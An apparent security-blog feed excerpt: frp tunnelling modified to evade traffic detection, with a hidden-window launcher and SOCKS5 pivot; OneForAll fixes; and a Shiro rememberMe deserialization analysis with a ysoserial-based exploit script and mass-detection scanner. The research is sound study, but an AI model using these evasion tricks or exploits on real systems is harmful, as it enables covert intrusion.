        <updated>2021-03-06T10:33:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-frp可优化的点">0x01 frp可优化的点</h3>
<ul>
<li>.ini配置文件泄露服务器信息</li>
<li>非TLS特征明显</li>
<li>frp 建立 TLS 连接的第一个字节为 0x17</li>
<li>客户端的留存的配置文件较敏感</li>
</ul>
<h3 id="0x02-优化">0x02 优化</h3>
<p><strong>.ini配置文件泄露服务器信息</strong></p>
<ul>
<li>路径: /frp/pkg/msg/msg.go</li>
</ul>
<p>frpc在连接认证frps的时候回把frp的版本信息等等发给frps进行认证。</p>
<p><code>json:&quot;version&quot;</code>修改为 <code>json:&quot;a&quot;</code>来逃避流量识别，以此类推</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/34099_image-20210306162911118.png" alt="image-20210306162911118" loading="lazy"></figure>
<p><strong>非TLS特征明显</strong></p>
<ul>
<li>frpc.ini 加入tls_enable = true</li>
</ul>
<p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tlsenable = true 来启用此功能，安全性更高。为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。通过将 frps.ini 的 [common] 中 tlsonly 设置为 true，可以强制 frps 只接受 TLS 连接。</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/82905_image-20210306180520465.png" alt="image-20210306180520465" loading="lazy"></figure>
<p><strong>第一个字节为0x17导致虽tls但特征明显</strong></p>
<ul>
<li>
<p>篇幅较长，推荐此参考链接，<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649740618&amp;idx=1&amp;sn=f1d67aaeab34a0329c5b648c7982c143">第一个字节为0x17的特征修改</a></p>
<p>如果是最新版frp，0x17的变量改名了,注意区分</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/38192_640.png" alt="img" loading="lazy"></figure>
<p><strong>客户端的敏感配置文件</strong></p>
<p>目前我知道的是3种解决办法，自选即可</p>
<ul>
<li>使用远程加载配置文件，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649740618&amp;idx=1&amp;sn=f1d67aaeab34a0329c5b648c7982c143">远程加载配置文件</a></li>
<li>配置文件自删除，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247484707&amp;idx=1&amp;sn=bcabbe88149c701b10707ad71572d927&amp;chksm=fcb787a6cbc00eb09b744f770bca318b9fc2fea42fb019ab3715fd1dabb08cf358e3af0b9892#rd">配置文件自删除</a></li>
<li>将客户端改成IP和port为传入参数，不加载配置文件，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247484160&amp;idx=1&amp;sn=c2ec78dd3586e9eb67bee4ab07475cdd&amp;chksm=fcb78185cbc00893f7efc9bed627583dcf7e5cfb1d9afd48ebd64bcdf97930c51de7a788c7f8#rd">传参版客户端</a></li>
</ul>
<h3 id="0x03-frp使用">0x03 frp使用</h3>
<ul>
<li>
<p>配置文件和frp根据自身使用情况修改，比如添加域前置或研究使用其他协议进行传输</p>
</li>
<li>
<p>服务端配置文件及启动，后台运行参考使用nohup命令或者以服务运行</p>
</li>
</ul>
<pre><code class="language-[common]">[common]
bind_port = 80
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/62050_image-20210306181221455.png" alt="image-20210306181221455" loading="lazy"></figure>
<ul>
<li>客户端配置文件及启动</li>
</ul>
<pre><code>[common]
server_addr = x.x.x.x
server_port = 80
protocol = tcp
tls_enable = true


[plugin_socks5]
type = tcp
remote_port = 6006
plugin = socks5
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/47497_image-20210306181435446.png" alt="image-20210306181435446" loading="lazy"></figure>
<p>windows后台运行的bat参考代码</p>
<pre><code class="language-bash">@echo off 
if &quot;%1&quot; == &quot;h&quot; goto begin 
mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit 
:begin 
c:\frpc.exe -c c:\frpc.ini
</code></pre>
<p><strong>此时连接服务端的socks5端口即可代理客户端的流量</strong></p>
<p>以msf为例，扫描的IP为与客户端机器同一网段的其他windows7机器</p>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/24315_image-20210306183038826.png" alt="image-20210306183038826" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[红色消失术☞oneforall的小改动]]></title>
        <id>https://www.svenbeast.com/post/V-ayqC-IY/</id>
        <link href="https://www.svenbeast.com/post/V-ayqC-IY/">
        </link>
        <updated>2021-02-15T04:38:59.000Z</updated>
        <content type="html"><![CDATA[<h4 id="先运行起来">先运行起来</h4>
<p>1.各api，自行用小飞机进行注册好</p>
<h4 id="解决红色报错">解决红色报错</h4>
<p>1.yahoo模块报错，代码中获得配置中的代理没生效，遂报错(提了issus)，在yahoo.py的第24行插入</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/81046_image-20210215124209258.png" alt="image-20210215124209258" loading="lazy"></figure>
<pre><code class="language-Python">self.proxy = self.get_proxy(self.source)
</code></pre>
<p>2.github的接口使用的语法有问题，没找到解决办法，遂忽略。没提issus，(-懒</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/45414_image-20210215124224173.png" alt="image-20210215124224173" loading="lazy"></figure>
<p>3.Fofa的模块等同于不存在，抓了下包，是因为使用的语法需要币，肯定没有，忽略忽略</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/37510_image-20210215124238197.png" alt="image-20210215124238197" loading="lazy"></figure>
<p>4.google_api的模块，header不需要了，加上key的header头反而会显示认证错误</p>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/69244_image-20210215124253052.png" alt="image-20210215124253052" loading="lazy"></figure>
<p>将google_api.py的29行代码注释掉即可</p>
<p>5.<a href="//114.55.181.28/check_web/databaseInfo_mainSearch.action">114.55.181.28/check_web/databaseInfo_mainSearch.action</a>这个是api升级了，一直没恢复，忽略</p>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/02/15/93186_image-20210215124304233.png" alt="image-20210215124304233" loading="lazy"></figure>
<h4 id="解决一些超时红色">解决一些超时红色</h4>
<p>1.oneforall设置的默认超时太短了，大部分网络应该达不到要求，default.py的101行代码斟酌修改一下</p>
<pre><code class="language-Python">request_timeout_second = (17.05, 27)  # 请求超时秒数(默认connect timout推荐略大于3秒)
</code></pre>
<p>2.oneforall里的一些国外网站的模块，虽然国内访问慢，但是能访问，所以默认是即便你设置了代理也并没有对这些模块生效，会大概率超时红色。setting.py的66行我的配置是以下的，全不全不太清楚，因为我关闭了大部分模块，只保留了oneforall独有的模块</p>
<pre><code class="language-Python">proxy_partial_module = ['GoogleQuery', 'AskSearch', 'DuckDuckGoSearch', 'GoogleAPISearch', 'GoogleSearch', 'YahooSearch',
                        'YandexSearch', 'CrossDomainXml', 'ContentSecurityPolicy', 'GithubAPISearch', 'HackerTargetQuery', 
                        'QianXunQuery', 'AskSearch', 'VirusTotalAPIQuery', 'Sublist3rQuery','ArchiveCrawl','CommonCrawl']  # 代理自定义的模块
</code></pre>
<p>3.虽然oneforall存在设置所有模块都启用代理的选项，但真设置了也会有问题，没深究。</p>
<p>4.个人的一些需求—我关闭了oneforall与subfinder重叠的模块，保留了他独有的，是在setting的33行代码设置的，当然32行要写改为False，下面是我筛选出来准备启用的</p>
<pre><code class="language-Python">enable_partial_module = ['modules.certificates.google','modules.check.axfr','modules.check.cdx','modules.check.cert','modules.check.csp','modules.check.nsec','modules.check.robots','modules.check.sitemap','modules.crawl.archivecrawl','modules.crawl.commoncrawl','modules.datasets.chinaz_api','modules.datasets.chinaz','modules.datasets.cloudflare_api','modules.datasets.ip138','modules.datasets.netcraft','modules.datasets.qianxun','modules.datasets.wzpc','modules.dnsquery.mx','modules.dnsquery.ns','modules.dnsquery.soa','modules.dnsquery.spf','modules.dnsquery.txt','modules.intelligence.riskiq_api','modules.search.ask','modules.search.baidu','modules.search.ask','modules.search.bing','modules.search.gitee','modules.search.google_api','modules.search.google','modules.search.so','modules.search.sogou','modules.search.yahoo','modules.search.yandex']  # 启用部分收集模块 必须禁用enable_all_module才能生效

</code></pre>
<p>5.同时我也关闭了爆破选项，准备用ksubdomain跑。。</p>
<ul>
<li>效果图:<br>
<img src="https://www.svenbeast.com/post-images/1613364402044.gif" alt="" loading="lazy"></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[【教科书】Shiro反序列化利用分析及其他一些有趣的知识]]></title>
        <id>https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/</id>
        <link href="https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/">
        </link>
        <updated>2021-01-11T13:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x00-背景">0x00 背景</h3>
<p>文章记录了分析shiro反序列化漏洞的思路和过程，漏洞用的次数挺多，感觉不认真走一遍分析还是缺点什么。排版是按照从issues中获得信息一步步分析的思路进行排版的， 不太专业  见谅 ┭┮﹏┭┮</p>
<p>友情提示：文章写的感觉比较亲民，理论上有一些其他语言的基础都可以阅读，比较倾向于写的详细一些这种写法(废话较多，忽略即可)，大概是看帖按着步骤走跟着思考大概自行理解的程度。</p>
<h3 id="0x01-梦开始的地方">0x01 梦开始的地方</h3>
<p>一切都要从官方shiro的某个人提出的问题描述开始说起 ~     下图为谷歌翻译结果</p>
<p>url: https://issues.apache.org/jira/browse/SHIRO-550</p>
<figure data-type="image" tabindex="1"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004803519.png" alt="image-20210107004803519" loading="lazy"></figure>
<p>通过描述可知：</p>
<ul>
<li>
<ol>
<li>shiro &lt;= 1.2.4 存在反序列化漏洞</li>
</ol>
</li>
<li>
<ol start="2">
<li>shiro的CookieRememberMeManager类里对漏洞参数rememberMe进行序列化，加密等操作，我理解成这个类和这个漏洞有关系，可以当成入口点</li>
</ol>
</li>
<li>
<ol start="3">
<li>shiro对每次访问都会用到&quot;记住我&quot;的功能进行以下操作：</li>
</ol>
<ul>
<li>检索<code>rememberMe</code> cookie的值     //cookie中是否有这个参数</li>
<li>Base 64解码    //对参数的值进行解码</li>
<li>使用AES解密   //对参数的值再进行解密</li>
<li>使用Java序列化（<code>ObjectInputStream</code>）反序列化。  //对解出的参数的值进行反序列化</li>
</ul>
</li>
<li>
<ol start="4">
<li>源代码存在默认的AES加密密钥，所有能够查看源代码的人都可以知道默认密钥是什么</li>
</ol>
</li>
</ul>
<p>以此确定一个需要通过Debug代码来达成的大概目的：</p>
<ul>
<li>通过<code>控制rememberMe参数的值</code>传输<code>加密</code>好的<code>恶意序列化payload</code>，成功让shiro进行解密到反序列化的步骤就可以达到执行命令的目的
<ul>
<li>
<ol>
<li><strong>如何控制rememberMe参数的值</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>如何对payload进行加密</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>根据加密方法对生成恶意序列化payload进行加密构造利用工具</strong></li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="0x02-科普时间">0x02 科普时间</h3>
<ul>
<li>
<p>AES加密算法：属于对称加密算法，意思就是加密和解密用相同的密钥</p>
<ul>
<li>
<p>加密过程：</p>
<p>明文 --&gt; AES加密函数 + 密钥位数(128/192.256)  + iv(初始化向量) + 密钥(key) + 模式(CBC和GCM等) + padding(填充方式)--&gt; 密文</p>
</li>
</ul>
</li>
<li>
<p>IDEA的Debug按钮功能：</p>
<p>Step Over : 单步执行,遇到方法直接获得返回值而不会进入<br>
Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中<br>
Force Step Into : 可以进入任何的方法，比如jdk,jar包<br>
Step Out : 在方法内会直接获得返回值跳出该方法<br>
Run To Cursor : 让程序运行到鼠标所在的位置<br>
Drop Frame : 返回上一步，摧毁当前方法获得的值<br>
Resume Program : 运行至下一个断点所在位置</p>
</li>
</ul>
<h3 id="0x03-分析独白">0x03 分析独白</h3>
<h4 id="1-环境配置">1. 环境配置</h4>
<p>研究的前提自然是要搭建好环境</p>
<p>下载shiro的漏洞环境，这里使用war包，放在tomcat的webapps里，启动tomcat，然后war包自动解析成文件夹，使用IDEA打开此文件夹</p>
<p>顺便讲一下IDEA配置调试shiro</p>
<pre><code>Run -&gt; Edit Configurations -&gt; 点击+号添加TomcatServer(Local) -&gt; Server中配置Tomcat路径 -&gt; 选择JRE版本 -&gt;Deployment中点击+号添加tomcat里生成的shiro文件夹 -&gt; 点击Apply
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004815840.png" alt="image-20210107004815840" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004826744.png" alt="image-20210107004826744" loading="lazy"></figure>
<p>运行起来</p>
<figure data-type="image" tabindex="4"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004835911.png" alt="image-20210107004835911" loading="lazy"></figure>
<h4 id="2-分析过程">2. 分析过程</h4>
<p>首先<strong>第一个目的</strong>是控制rememberMe参数的值,先找到参数所在位置，对环境的功能先正常使用一遍</p>
<p>当我访问http://localhost:8080/shiro_web_1_2_4_war/login.jsp  登录时勾选Remember Me后，cookie中出现rememberMe参数，而shiro每次都会对cookie中的rememberMe来进行解密后反序列化操作来确定访问者权限，所以直接在cookie传输rememberMe参数就可以控制shiro反序列化的值</p>
<figure data-type="image" tabindex="5"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004847419.png" alt="image-20210107004847419" loading="lazy"></figure>
<p><strong>第二个目的</strong>是获得加密解密的方法，以此来自行加密解密恶意payload进行传输</p>
<p>反编译此漏洞环境中的shiro组件jar包</p>
<p><code>选中shiro-core-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</code></p>
<p><code>选中shiro-web-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</code></p>
<figure data-type="image" tabindex="6"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004855138.png" alt="image-20210107004855138" loading="lazy"></figure>
<p>IDEA中按两次shift 搜索咱们前面准备当做入口点的CookieRememberMeManager类，按着函数列表查看后并未发现有关加密的信息，so跟进父类AbstractRememberMeManager去看一下</p>
<figure data-type="image" tabindex="7"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004908000.png" alt="image-20210107004908000" loading="lazy"></figure>
<p>进入此类可以发现一个很明显的key，根据参数名<code>DEFAULT_CIPHER_KEY_BYTES</code>也可以断定是AES加密中所使用的密钥，同时确实是直接写入了代码中，符合上面通过描述可知的AES密钥硬编码在源代码中的条件</p>
<figure data-type="image" tabindex="8"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004916235.png" alt="image-20210107004916235" loading="lazy"></figure>
<p>这里我在AbstractRememberMeManager类函数名为encrypt(加密)中下了断点，然后在web端进行登录操作，开始debug，运行至encrypt函数传入参数serialized，然后点击Drop Frame返回上个方法发现传入的serialized的值是我刚才web端登录的用户名root序列化后的数据，根据运行步骤函数名猜测流程是shiro验证完了登录的账号密码，然后根据用户名生成序列化数据准备进行加密了</p>
<!--在这里下断点的原因：1.习惯先看类的函数列表，这个函数名作用很明显emm。。  2.因为已知每次访问shiro会对rememberMe进行解密来得知对应的访问用户，所以对应的是用户登录时shiro会根据登录用户进行加密并赋值给rememberMe参数-->
<figure data-type="image" tabindex="9"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004925147.png" alt="image-20210107004925147" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004931833.png" alt="image-20210107004931833" loading="lazy"></figure>
<pre><code class="language-java">再次敲黑板
  
Debug按钮功能：
  Step Over : 单步执行,遇到方法直接获得返回值而不会进入
  Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中
  Force Step Into : 可以进入任何的方法，比如jdk,jar包
  Step Out : 在方法内会直接获得返回值跳出该方法
  Run To Cursor : 让程序运行到鼠标所在的位置
  Drop Frame : 返回上一步，摧毁当前方法获得的值
  Resume Program : 运行至下一个断点所在位置
</code></pre>
<p>在调试的变量框里看到加密的设置为AES加密，模式为CBC，128位，填充方式为PKCS5Padding</p>
<figure data-type="image" tabindex="11"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004940817.png" alt="image-20210107004940817" loading="lazy"></figure>
<p>继续Force Step Into(下一步)，进入cipherService.encrypt的方法中，跳到了JcaCipherService类中的encrypt方法中,方法中有个ivBytes变量，值是随机生成的16个字节，然后跳到了此类中的另一个encrypt方法，就是图片框中下面那个encrypt方法</p>
<pre><code>【+】return this.encrypt(plaintext, key, ivBytes, generate);

plaintext 为 序列化的用户名
key 为 DEFAULT_CIPHER_KEY_BYTES 就是上面base64解码的那个密钥
ivBytes 为 随机生成的长度为16的字节
generate 为 true
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004950559.png" alt="image-20210107004950559" loading="lazy"></figure>
<p>跳入的encrypt方法，不清楚java的一些方法作用一定要看图片中的备注，这个方法就是真正的生成加密结果的地方，我会描述的详细一点，因为我是垃圾不写就忘</p>
<figure data-type="image" tabindex="13"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004958406.png" alt="image-20210107004958406" loading="lazy"></figure>
<p>继续Step Over(下一步)，就回到了梦开始(下的断点)的地方 ~，value变量的值就是上面步骤的output变量的值</p>
<figure data-type="image" tabindex="14"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005007305.png" alt="image-20210107005007305" loading="lazy"></figure>
<p>继续使用Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，盯着存储着加密结果的变量，遇到没有对此变量操作的直接获得返回值下一步，最终到了CookieRememberMeManager类中的rememberSerializedIdentity方法又对存储着加密结果的变量进行了一次base64加密，然后赋值到了cookie的rememberMe参数中，到此加密过程结束。</p>
<figure data-type="image" tabindex="15"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005015379.png" alt="image-20210107005015379" loading="lazy"></figure>
<p><strong>最终总结加密过程为</strong>：</p>
<p>设定：<strong>密钥</strong> = kPH+bIxk5D2deZiIxcaaaA==</p>
<p>1.获得明文 = 正常识序列化用户名后的字节(root)      <!--可以理解为ysoserial生成的payload--></p>
<p>2.以下步骤：</p>
<ul>
<li>
<p>科普知识：正常的AES加密所需参数 = 想加密的字符串 + iv + key + CBC + padding</p>
</li>
<li>
<p>shiro：AES加密 = 想加密的字符串 (<code>明文</code>) + iv(<code>随机生成的长度为16的字节</code>) +  key(<code>base64解码<strong>密钥</strong>的结果</code>) + CBC + PKCS5Padding</p>
</li>
</ul>
<p>3.随机生成的长度为16的字节 + AES加密结果   (就是拼接了一下)</p>
<p>4.base64加密</p>
<p><strong>那么解密过程为</strong>:</p>
<p>设定：<strong>密钥</strong> = kPH+bIxk5D2deZiIxcaaaA==</p>
<p>1.获得密文 = base64解密rememberMe参数传过来的值</p>
<p>2.以下步骤：</p>
<ul>
<li>
<p>科普知识：正常的AES解密所需参数 = 想解密的字符串 + iv + key + CBC</p>
</li>
<li>
<p>shiro：AES解密 = 想解密的字符串(<code>删除密文前16个字节的剩余字节</code>)+iv(<code>密文的前16个字节</code>) + key(<code>base64解码<strong>密钥</strong>的结果</code>) + CBC + PKCS5Padding</p>
</li>
</ul>
<p>3.对解密结果进行反序列化，触发payload</p>
<p>​	在进行第三个目的前看一下最终触发反序列化的地方在哪里，按照加密方法调试过程，在解密方法处添加断点，然后在网页上先登录后，开启调试，运行至decrypt方法停住后进行Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，直到DefaultSerializer的deserialize方法。</p>
<p>​	找到shiro进行序列化和反序列化的代码位置后，可以发现shiro的serialize方法使用ByteArrayOutputStream创建了字节数组缓冲区来存储序列化的字节码，而不是生成落地文件，回到deserialize方法，同样生成缓冲区存储传过来的序列化字节，进行反序列化，并最终运行了readObject方法，如果反序列化的是我们的payload，到这里就执行命令了。</p>
<figure data-type="image" tabindex="16"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005025077.png" alt="image-20210107005025077" loading="lazy"></figure>
<p><strong>第三个目的</strong>是构造脚本进行利用，先将shiro的加密过程和解密过程写出来(高版本GCM模式的脚本没写，小改一下就是了)</p>
<pre><code class="language-python">def encode(target):
    iv   =  uuid.uuid4().bytes  #用好看的方式随机生成16字节
    # iv = bytes('1111111111111111',encoding='utf-8')
    realkey = base64.b64decode(key)  #解密key
    mode = AES.MODE_CBC
    pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充
    resultAES = AES.new(realkey,mode,iv)
    nice = resultAES.encrypt(pad(target))
    nice = iv + nice
    nice = base64.b64encode(nice)

    print(&quot;加密目标:\n&quot; + str(target) + &quot;\n\n加密结果:\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\n&quot;)


def decode(target):
    
    realkey = base64.b64decode(key)  #解密key
    targetText = base64.b64decode(target) # 想要解密的密文

    iv = targetText[0:16]
    realText = targetText[16:]
    mode = AES.MODE_CBC

    resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
    nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
    print(&quot;\n解密目标:\n&quot; + target + &quot;\n\n解密结果:\n&quot; + nice + &quot;\n&quot;)
</code></pre>
<p>然后是加上 使用ysoserial生成的java存在反序列化漏洞依赖库的payload，一个利用代码模子就出来了，优秀的工具已经有很多了，就不一一列举了，我的to do里是有整合利用链的想法的，不过yso的cb利用链还在努力自闭中~ 因为我根本就不会java呀 (#<sup>.</sup>#) ，暂时学习了一些需要的前置知识，然后分析了最简单的URLDNS，有时间我整理一下学习的笔记在水一下。</p>
<pre><code class="language-python">from Crypto.Cipher import AES
import base64,uuid
import subprocess

decodeTarget = ''
encodeTarget = 'root'
key = 'kPH+bIxk5D2deZiIxcaaaA=='



def encode(target):
    iv   =  uuid.uuid4().bytes  #用好看的方式随机生成16字节
    # iv = bytes('1111111111111111',encoding='utf-8')
    realkey = base64.b64decode(key)  #解密key
    mode = AES.MODE_CBC
    pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充
    resultAES = AES.new(realkey,mode,iv)
    nice = resultAES.encrypt(pad(target))
    nice = iv + nice
    nice = base64.b64encode(nice)

    print(&quot;加密目标:\n&quot; + str(target) + &quot;\n\n加密结果:\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\n&quot;)


def decode(target):
    
    realkey = base64.b64decode(key)  #解密key
    targetText = base64.b64decode(target) # 想要解密的密文

    iv = targetText[0:16]
    realText = targetText[16:]
    mode = AES.MODE_CBC

    resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
    nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
    print(&quot;\n解密目标:\n&quot; + target + &quot;\n\n解密结果:\n&quot; + nice + &quot;\n&quot;)


popen = subprocess.Popen('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 &quot;sleep-5&quot;', shell=True, stdout=subprocess.PIPE)
file_body = popen.stdout.read()         #读取生成的payload字节码

decode(decodeTarget)
encode(file_body)


</code></pre>
<h3 id="0x04-shiro组件检测">0x04 shiro组件检测</h3>
<p>写的一个检测shiro组件的脚本，速度很快。</p>
<pre><code class="language-python">import requests
import sys,re
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()


def exp(line):
    header={
    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
    'Cookie':'a=1;rememberMe=1'

    }

    check_one=&quot;rememberMe&quot; #场景1
    check_two=&quot;deleteMe&quot; #场景2

    isExist = False

    with open('ScanResult.txt',&quot;a&quot;) as f:
        if 'http' not in line:
            line = 'http://'+line
        try:
            x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #场景4
            y = str(x.headers)
            z = checkRe(y) 

            a = requests.head(line,headers=header,verify=False,timeout=6) #场景5
            b = str(a.headers)
            c = checkRe(b) 
            
            if check_one in y or z or check_two in y or c:
                isExist = True

            if isExist:
                print(&quot;[+ &quot;+&quot;!!! 存在shiro: &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot;   url: &quot;+line)
                f.write(line+&quot;\n&quot;)
            else:
                print(&quot;[- &quot;+&quot;不存在shiro  &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot;  url: &quot;+line)

        except Exception as httperror:
            print(&quot;[- &quot;+&quot;目标超时, 疑似不存活: &quot;+&quot;  url: &quot;+line)
            


def checkRe(target): #场景3

    pattern = re.compile(u'^re(.*?)Me') 
    result  = pattern.search(target)
    if result:
        return True
    else:
        return False

def multithreading(funcname, params=[], filename=&quot;ip.txt&quot;, pools=5):
    works = []
    with open(filename, &quot;r&quot;) as f:
        for i in f:
            func_params = [i.rstrip(&quot;\n&quot;)] + params
  
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)

    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], &quot;url.txt&quot;, 10)  # 默认15线程
    print(&quot;全部check完毕，请查看当前目录下的shiro.txt&quot;)

            
if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>判定是否存在shiro的条件:</p>
<ul>
<li>1.发送带有rememberMe=1的cookie，返回http头是否存在rememberMe</li>
<li>2.发送带有rememberMe=1的cookie，返回http头是否存在deleteMe</li>
<li>3.发送带有rememberMe=1的cookie，返回http头是否存在匹配正则<code>^re(.*?)Me</code>的</li>
<li>4.发送带有rememberMe=1的cookie，请求时脚本设置成跟随跳转后检测前两项</li>
<li>5.发送带有rememberMe=1的cookie，请求时脚本设置成不跟随跳转检测前两项</li>
</ul>
<p>一开始写的时候检测条件是检测的rememberMe=deleteMe字符串，因为见过网站返回头是下图这样的(开发祭天)，返回http头是remeberMe=deleteMe 。。就分开检测了字符串，再加了个正则保险下。</p>
<figure data-type="image" tabindex="17"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005041182.png" alt="image-20210107005041182" loading="lazy"></figure>
<p>有的网站会自动跳转到某个路径显示首页，所以设置了跟随跳转和不跟随跳转，没图脑补吧，检测思路是这样的，有的站的shiro组件存在检测还要是登录页输入账号密码登录时的那个路径或者和post提交有关，所以可以再加个post方式请求的判断条件，还可以学爬虫自动输入账号密码post提交这种的判断条件，具体代码就得自行发挥啦</p>
<h3 id="0x05-shiro组件的默认gadget">0x05 shiro组件的默认gadget</h3>
<p>Shiro是开源的，所以shiro的源码在github上可以找到，而开发在开发项目的时候如果通过pom.xml引入shiro时，会自动引入commons-beanutils库，而这个依赖库正是存在反序列化利用的java依赖库之一，并且一一查看后发现shiro版本对应的commons-beanutils库的版本有些许不同</p>
<figure data-type="image" tabindex="18"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110742.png" alt="image-20210112110742559" loading="lazy"></figure>
<p>查看不同版本shiro的pom.xml后总结对应关系为:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Shiro版本</th>
<th style="text-align:center">CB链</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.1.0">shiro-root-1.1.0</a>(不包含)—更早版本</td>
<td style="text-align:center">1.7.0</td>
</tr>
<tr>
<td style="text-align:center">shiro-root-1.1.0(包含)—1.3.2(包含)</td>
<td style="text-align:center">1.8.3</td>
</tr>
<tr>
<td style="text-align:center">1.4.0(包含)—1.4.2(包含)</td>
<td style="text-align:center">1.9.3</td>
</tr>
<tr>
<td style="text-align:center">1.5.0(包含)—<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.7.0">shiro-root-1.7.0</a>(包含)</td>
<td style="text-align:center">1.9.4</td>
</tr>
</tbody>
</table>
<p>然后又去查看了Github上commons-beanutils项目的pom.xml，从1.8.3开始看的，里面是内置了commons-collections链</p>
<figure data-type="image" tabindex="19"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110526.png" alt="image-20210112110526889" loading="lazy"></figure>
<table>
<thead>
<tr>
<th style="text-align:center">CB链</th>
<th style="text-align:center">CC链</th>
